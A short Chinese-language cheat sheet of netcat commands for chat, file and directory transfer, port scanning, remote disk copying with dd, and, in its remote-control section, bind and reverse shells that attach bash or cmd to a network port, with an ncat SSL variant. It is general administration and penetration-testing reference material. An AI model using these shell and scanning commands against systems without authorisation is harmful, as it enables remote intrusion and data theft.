### 聊天/信息传递<br>
Server:   <br>>nc -l -p 4444   <br>Client:    <br>>nc -nv IP 4444   <br>### 电子取证<br>
Server：    <br>>nc-l -p 4444 > remote.txt    <br>Client： -q 表示完成后多少秒后退出   <br>>ls-l | nc -nv IP 4444 -q 1   <br><br>
### 文件传输<br>
Server: 接收文件    <br>>nc -lp 4444 > 1.mp3   <br>Client: 发送文件    <br>>nc -nv IP 4444 < 1.mp3 -q 1   <br>### 目录传输<br>
Server: 接收文件    <br>>tar -cvf - music/ | nc -lp 4444 -q 1   <br>Client: 发送文件    <br>>nc -nv IP 4444 | tar -xvf -    <br><br>
### 端口扫描（作为辅助参考，不一定准确，结合其他工具，例如nmap）<br>
TCP 端口：  <br>>nc -nvz IP 1-65535    <br>UDP 端口：   <br>>nc -nvzu IP 1-65535  <br><br>
### 远程硬盘拷贝（用于电子取证，删除文件还原）<br>
远程接收  <br>>nc -lp 4444 | dd of=/dev/sda1   <br>被拷贝   <br>>dd if=/dev/sda | nc -lp 4444 -q 1    <br><br>
### 远程控制<br>
正向：    <br>>nc -lp 4444 -c bash    <br>>nc IP 4444   <br>反向：    <br>>nc -lp 4444   <br>>nc IP 4444 -c bash  <br>如果是Windows，将bash换成cmd    <br><br>
### NC缺乏加密和身份验证功能， 用ncat 来替换<br>
>ncat -c bash --allow ClientIP -nvl 4444 --ssl   <br>>ncat -nv ServerIP 4444 --ssl   <br><br>
<br>
